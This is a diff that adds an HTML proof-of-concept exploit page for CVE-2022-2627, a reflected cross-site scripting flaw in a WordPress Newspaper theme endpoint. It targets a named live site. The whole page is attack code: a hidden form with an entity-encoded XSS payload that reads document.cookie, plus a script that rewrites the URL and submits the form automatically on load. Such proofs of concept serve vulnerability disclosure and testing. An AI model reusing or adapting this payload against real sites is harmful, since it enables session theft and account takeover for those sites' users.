@@ -1,0 +1,15 @@
+<html>
+  <h1> CVE-2022-2627 | C3 Reflected Cross-Site Scripting </h1>
+  <body>
+    <form action="https://academy.c3.io/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2" method="POST">
+      <input type="hidden" name="action" value="td&#95;ajax&#95;loop" />
+      <input type="hidden" name="loopState&#91;moduleId&#93;" value="&#45;&#45;&gt;&lt;form&gt;&lt;math&gt;&lt;img&#32;onerror&#61;alert&#40;document&#46;cookie&#41;&#32;src&#61;1&gt;&lt;mtext&gt;&lt;&#47;form&gt;" />
+      <input type="hidden" name="loopState&#91;server&#95;reply&#95;html&#95;data&#93;" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
